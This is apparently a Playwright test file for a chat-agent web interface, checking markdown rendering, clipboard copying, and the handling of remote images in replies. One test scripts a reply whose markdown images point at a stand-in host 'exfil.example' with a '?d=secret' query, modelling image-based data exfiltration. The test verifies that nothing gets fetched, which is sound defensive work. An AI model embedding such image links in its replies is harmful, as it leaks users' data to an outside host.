import { acpScriptToken, expect, SCRIPTED_ACP_HARNESS, sessionRoute, test } from "../harness"

const REPLY = [
  "# Heading with `code`",
  "",
  "A paragraph with **bold**, *emphasis*, ~~struck~~, a [link](https://example.com/docs \"Docs\"), an autolink https://example.org/page and raw <b>markup</b> & entities &copy;.",
  "",
  "> A quote with a list:",
  "> - one",
  "> - two",
  "",
  "1. First",
  "   - nested *item*",
  "   - [x] done",
  "2. Second",
  "",
  "| left | right |",
  "| :--- | ----: |",
  "| `a` | **b** |",
  "",
  "Inline math $x^2$ and display math:",
  "",
  "$$a+b=c$$",
  "",
  "```ts",
  "const answer: number = 42",
  "```",
  "",
  "```mermaid",
  "graph TD",
  "  A-->B",
  "```",
  "",
  "---",
  "",
  "Markup parsed.",
].join("\n")

test("30 a markdown block's committed markup parses to the same DOM as a separate document imported into the page", async ({ stack, api, app }) => {
  const workspace = await stack.daemon.makeWorkspace("markup")
  await stack.acp.write("markup", { steps: [{ kind: "text", text: REPLY }] })
  const session = await api.createSession(workspace.directory, { title: "Markup", harness: SCRIPTED_ACP_HARNESS })
  await api.prompt(workspace.directory, session.id, `Show the markup. ${acpScriptToken("markup")}`)
  await app.goto(`${stack.url}${sessionRoute(workspace.id, session.id)}`)
  await expect(app.getByText("Markup parsed.")).toBeVisible()
  await expect(app.locator('[data-slot="mermaid-diagram"] svg')).toBeVisible()

  const blocks = await app.evaluate(() =>
    Array.from(document.querySelectorAll("[data-markdown-key], [data-slot='mermaid-diagram']"), (element) => {
      const html = element.innerHTML
      const assigned = document.createElement("div")
      assigned.innerHTML = html
      const imported = document.createElement("div")
      const parsed = new DOMParser().parseFromString(html, "text/html")
      imported.replaceChildren(...Array.from(parsed.body.childNodes, (node) => document.importNode(node, true)))
      return { key: element.getAttribute("data-markdown-key") ?? "mermaid", size: html.length, same: assigned.isEqualNode(imported) }
    }),
  )
  expect(blocks.length).toBeGreaterThan(5)
  expect(blocks.filter((block) => block.key === "mermaid")).toHaveLength(1)
  expect(blocks.filter((block) => !block.same)).toEqual([])
})

const REMOTE_MEDIA = [
  "Read this first ![leaked notes](https://exfil.example/c?d=secret) and this ![host relative](//exfil.example/p.png).",
  "",
  "Remote media withheld.",
].join("\n")

test("30 a remote image in a reply is a link to its source, and nothing is fetched from that host", async ({ stack, api, app }) => {
  const fetched: string[] = []
  app.on("request", (request) => {
    if (new URL(request.url()).hostname === "exfil.example") fetched.push(request.url())
  })
  const workspace = await stack.daemon.makeWorkspace("remote-media")
  await stack.acp.write("remote-media", { steps: [{ kind: "text", text: REMOTE_MEDIA }] })
  const session = await api.createSession(workspace.directory, { title: "Remote media", harness: SCRIPTED_ACP_HARNESS })
  await api.prompt(workspace.directory, session.id, `Show the notes. ${acpScriptToken("remote-media")}`)
  await app.goto(`${stack.url}${sessionRoute(workspace.id, session.id)}`)
  await expect(app.getByText("Remote media withheld.")).toBeVisible()

  await expect(app.getByRole("link", { name: "leaked notes" })).toHaveAttribute("href", "https://exfil.example/c?d=secret")
  await expect(app.getByRole("link", { name: "host relative" })).toHaveAttribute("href", /^https?:\/\/exfil\.example\/p\.png$/)
  await expect(app.getByRole("img", { name: "leaked notes" })).toHaveCount(0)
  expect(fetched).toEqual([])
})

test("30 copy response puts the reply's markdown on the clipboard", async ({ stack, api, app, isMobile }) => {
  test.skip(isMobile, "the copy button is revealed by hover")
  await app.context().grantPermissions(["clipboard-read", "clipboard-write"])
  const workspace = await stack.daemon.makeWorkspace("copy")
  await stack.acp.write("copy", { steps: [{ kind: "text", text: "A **copied** reply." }] })
  const session = await api.createSession(workspace.directory, { title: "Copy", harness: SCRIPTED_ACP_HARNESS })
  await api.prompt(workspace.directory, session.id, `Reply. ${acpScriptToken("copy")}`)
  await app.goto(`${stack.url}${sessionRoute(workspace.id, session.id)}`)
  await app.getByText("copied", { exact: true }).hover()
  await app.getByRole("button", { name: "Copy response" }).click()
  await expect(app.getByRole("button", { name: "Copied" })).toBeVisible()
  expect(await app.evaluate(() => navigator.clipboard.readText())).toBe("A **copied** reply.")
})
